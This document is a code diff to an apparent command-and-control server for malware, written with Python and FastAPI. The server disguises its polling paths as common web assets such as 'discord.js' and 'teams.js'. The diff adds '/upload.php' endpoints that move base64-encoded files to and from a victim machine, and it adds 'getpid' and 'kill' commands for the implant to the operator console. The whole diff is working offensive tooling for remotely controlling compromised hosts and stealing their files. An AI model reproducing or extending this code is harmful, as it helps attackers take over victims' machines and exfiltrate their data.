@@ -23,6 +23,7 @@ cmdRequests = [
 "styles.css",
 "app.css",
 "discord.js",
+"teams.js",
 "app.js",
 "channels.json",
 "messages.json",
@@ -64,6 +65,18 @@ class bcolors:
 def fancyprint(text: str):
     print("\r" + text + "\n$ ", end="")
 
+@app.get("/upload.php/{file:path}", response_class=PlainTextResponse)
+async def upload_file(file: str, request: Request):
+    print("get upload")
+    data = encodeFile(file)
+    return data
+
+@app.post("/upload.php/{file:path}")
+async def download_file(file: str, request: Request):
+    data: dict = await request.json()
+    #print(file, data["result"])
+    decodeFile(file, data["result"])
+
 @app.get("/{path:path}", response_class=PlainTextResponse)
 async def get_command(path: str, request: Request):
     if path in cmdRequests: 
@@ -80,6 +93,19 @@ async def send_output(path: str, request: Request):
         data: dict = await request.json()
         fancyprint("Output:")
         fancyprint(data["result"])
+
+def encodeFile(filePath):
+    with open(filePath, 'rb') as file:
+        content = file.read()
+        encoded = base64.b64encode(content)
+        return encoded
+
+def decodeFile(filePath, content):
+    decoded = base64.b64decode(content)
+    with open(filePath, 'wb') as file:
+        file.write(decoded)
+    
+        
 
 def printHeader():
     print(f"""{bcolors.FAIL} 
@@ -158,6 +184,8 @@ def input_thread():
         #help
         if new_cmd == "help":
             print("""Run a command on the victim or
+    - use \"getpid\" to get the process ID of the implant.
+    - use \"kill\" to kill the implant.
     - use \"history\" to view command history.
     - use \"help\" to view this help message.
     - use \"exit\" to exit.
@@ -175,6 +203,8 @@ def input_thread():
                 print("Queue:")
                 for cmd in CMD_QUEUE:
                     print("  " + cmd)
+        #elif new_cmd.split(' ')[0] == "upload":
+            #encodeFile(new_cmd.split(' ')[1])
         #exit
         elif new_cmd == "exit":
             print("Exitting...")
@@ -185,7 +215,7 @@ def input_thread():
         elif new_cmd == "banner":
             printHeader()
         #execute command on victim
-        else:
+        elif new_cmd.strip() != "":
             CMD_QUEUE.append(new_cmd)
         #commands queued up
         if len(CMD_QUEUE) > 1:
